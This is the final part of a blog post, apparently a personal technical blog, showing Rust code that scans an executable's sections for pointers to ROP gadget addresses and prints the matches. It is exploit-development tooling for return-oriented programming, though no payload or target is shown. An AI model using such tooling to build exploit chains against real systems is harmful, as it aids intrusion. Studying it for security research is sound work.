</span><span>            </span><span style="color:#b48ead;">let</span><span> address_bytes = </span><span style="color:#b48ead;">match</span><span> obj_endianness {
</span><span>                Endianness::Little =&gt; </span><span style="color:#b48ead;">u64</span><span>::from_str_radix(hex_address, </span><span style="color:#d08770;">16</span><span>)
</span><span>                    .</span><span style="color:#96b5b4;">expect</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid hexadecimal string</span><span>&quot;)
</span><span>                    .</span><span style="color:#96b5b4;">to_le_bytes</span><span>(),
</span><span>                Endianness::Big =&gt; </span><span style="color:#b48ead;">u64</span><span>::from_str_radix(hex_address, </span><span style="color:#d08770;">16</span><span>)
</span><span>                    .</span><span style="color:#96b5b4;">expect</span><span>(&quot;</span><span style="color:#a3be8c;">Invalid hexadecimal string</span><span>&quot;)
</span><span>                    .</span><span style="color:#96b5b4;">to_be_bytes</span><span>(),
</span><span>            };
</span><span>            addresses.</span><span style="color:#96b5b4;">push</span><span>(address_bytes);
</span><span>            rop_lines.</span><span style="color:#96b5b4;">push</span><span>(line);
</span><span>        }
</span><span>    }
</span><span>
</span><span>    </span><span style="color:#65737e;">// Search for pointers to the ROP gadget addresses in the sections of the executable file. It uses rayon&#39;s par_windows method to perform
</span><span>    </span><span style="color:#65737e;">// the search in parallel, and the enumerate and filter_map methods to find the indices of the addresses and their corresponding ROP gadget lines.
</span><span>    </span><span style="color:#b48ead;">let</span><span> found_addresses = sections_bytes.</span><span style="color:#96b5b4;">into_iter</span><span>().</span><span style="color:#96b5b4;">flat_map</span><span>(|(</span><span style="color:#bf616a;">s_addr</span><span>, </span><span style="color:#bf616a;">s_data</span><span>)| {
</span><span>        s_data
</span><span>            .</span><span style="color:#96b5b4;">par_windows</span><span>(obj_address_size)
</span><span>            .</span><span style="color:#96b5b4;">enumerate</span><span>()
</span><span>            .</span><span style="color:#96b5b4;">filter_map</span><span>(|(</span><span style="color:#bf616a;">i</span><span>, </span><span style="color:#bf616a;">window</span><span>)| {
</span><span>                addresses
</span><span>                    .</span><span style="color:#96b5b4;">iter</span><span>()
</span><span>                    .</span><span style="color:#96b5b4;">map</span><span>(|</span><span style="color:#bf616a;">addr</span><span>| addr.</span><span style="color:#96b5b4;">get</span><span>(..obj_address_size).</span><span style="color:#96b5b4;">unwrap</span><span>())
</span><span>                    .</span><span style="color:#96b5b4;">position</span><span>(|</span><span style="color:#bf616a;">addr</span><span>| addr == window)
</span><span>                    .</span><span style="color:#96b5b4;">map</span><span>(|</span><span style="color:#bf616a;">addr_i</span><span>| (i + s_addr, rop_lines[addr_i]))
</span><span>            })
</span><span>            .collect::&lt;Vec&lt;(</span><span style="color:#b48ead;">usize</span><span>, &amp;</span><span style="color:#b48ead;">str</span><span>)&gt;&gt;()
</span><span>    });
</span><span>
</span><span>    found_addresses.</span><span style="color:#96b5b4;">for_each</span><span>(|(</span><span style="color:#bf616a;">a</span><span>, </span><span style="color:#bf616a;">l</span><span>)| println!(&quot;</span><span style="color:#a3be8c;">{:#010X} --&gt; </span><span style="color:#d08770;">{}</span><span>&quot;, a + base_address, l));
</span><span>}
</span></code></pre>
<p>See you later, alligator! :)</p>


<p class="tagsData">
  
</p>

      </main>
      <footer>
          <hr>
<div class=footContainer>
  <div class="footLeft">
      Built with <a target="_blank" rel="noopener noreferrer" href="https://www.getzola.org">Zola</a> using <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/anemone">anemone</a> theme &amp; <a target="_blank" rel="noopener noreferrer" href="https://github.com/Speyll/veqev">veqev</a> colors.<br>
    </p>
  </div>
  
  <div class="footRight">
    <a class="icons__background" target="_blank" rel="noopener noreferrer" href="https://guas.ch/atom.xml" title="Subscribe via RSS for updates."><svg class="icons icons__background"><use href="https://guas.ch/icons.svg#rss"></use></svg></a>
  </div>
  
</div>
      </footer>
    </div>
</body>
</html>